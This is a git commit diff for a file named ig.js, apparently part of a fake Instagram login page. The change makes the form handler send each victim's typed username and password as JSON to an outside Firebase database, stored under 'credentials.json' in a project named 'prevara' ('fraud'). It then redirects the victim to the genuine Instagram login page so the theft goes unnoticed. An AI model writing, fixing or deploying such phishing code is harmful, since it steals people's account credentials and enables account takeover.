e5a470596acdb4891a19033cbcf863af9dda63d2
Puskass <cosovictarik7111@gmail.com>
2023-01-25 11:14:26 +0100

    js zavrsen(ne radi)

--- ig.js
+++ ig.js
@@ -3,21 +3,19 @@ const userInputs = document.querySelectorAll("input")
 const loginBtn = document.getElementById("login-btn")
 
 //Functions
-const loginFormHandler = (event) => {
+const loginFormHandler = async (event) => {
     event.preventDefault()
     console.log("submited")
     const username = userInputs[0].value
     const password = userInputs[1].value
 
-    fetch("https://prevara-86dc3-default-rtdb.europe-west1.firebasedatabase.app/",{
+    await fetch("https://prevara-86dc3-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
         method: "POST",
-        body: { username, password },
-        
+        body: JSON.stringify({ username, password }),
+        headers: {"Content-Type": "application/json" },
     })
+    window.location.replace("https://www.instagram.com/accounts/login/")
 }
 
 //Event Listeners
 loginBtn.addEventListener("click", loginFormHandler)
-
-//Testing
-console.log(userInputs)
